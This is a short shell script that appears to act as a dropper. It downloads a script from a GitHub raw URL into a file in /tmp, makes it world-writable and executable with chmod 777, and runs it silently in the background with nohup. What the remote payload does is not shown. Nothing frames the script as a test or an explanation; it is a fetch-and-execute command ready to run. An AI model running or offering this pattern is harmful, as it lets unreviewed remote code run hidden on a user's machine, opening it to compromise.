#!/bin/sh

 
FILE_NAME="/tmp/asdfasdf.sh"
/bin/curl https://raw.githubusercontent.com/wulimama001/test/master/test.sh -o $FILE_NAME

chmod 777 $FILE_NAME


/usr/bin/nohup  /bin/bash $FILE_NAME > "$FILE_NAME.log" 2>&1 &
